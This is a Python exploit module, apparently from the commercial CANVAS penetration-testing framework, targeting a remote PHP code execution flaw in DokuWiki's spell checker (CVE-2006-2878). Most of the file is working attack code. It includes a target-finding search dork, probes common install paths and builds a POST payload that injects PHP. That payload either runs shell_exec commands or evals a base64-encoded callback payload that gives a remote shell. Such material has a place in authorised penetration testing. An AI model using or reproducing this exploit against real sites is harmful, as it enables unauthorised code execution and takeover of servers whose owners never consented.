#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.phpexploit import *
import canvasengine
import urllib
import libs.spkproxy as spkproxy #for urlopen

NAME="DokuWiki Spell Checker Embedded Link Arbitrary PHP Code Execution  "
DESCRIPTION="DokuWiki Spell Checker Embedded Link Arbitrary PHP Code Execution  "
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="DokuWiki"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]="CVE-2006-2878"
DOCUMENTATION["References"]=["http://www.hardened-php.net/advisory_042006.119.html"]
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["DORK"]=["Driven by DokuWiki"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
"""

CHANGELOG="""
"""

class theexploit(phpexploit):
    def __init__(self):
        phpexploit.__init__(self)
        self.port=80
        self.host=""
        self.setVersions()
        self.version=0
        self.done=0
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/dokuwiki-2006-03-05/","/wiki/","/doku/","/"]
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        self.verb="POST"
        self.content_type="application/x-www-form-urlencoded"
        self.targetpath="lib/exe/spellcheck.php"
        self.foundstrings=["DokuWiki"]
        self.testfile="doku.php"
        
        return
    
    def getbody(self):
        """
        Creates a preg_replace exploit string that either executes a command
        or uses our callback shellcode
        """
        
        if self.command:
            self.log("Command: %s"%self.command)
            command=self.command
            command=self.encode_php(command)
            exp="call=check&utf8=1&data=[[{${print shell_exec("+command+")}}{${die}}]]"
        else:
            command=self.get_php_to_mosdef()
            command=b64encode(command).strip()
            command=self.encode_php(command)
            exp="call=check&utf8=1&data=[[{${eval(base64_decode("+command+"))}}]]"
        return exp 
    
    def parse_command_response(self, data):
        """
        Give me the result of my command
        """
        return data
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
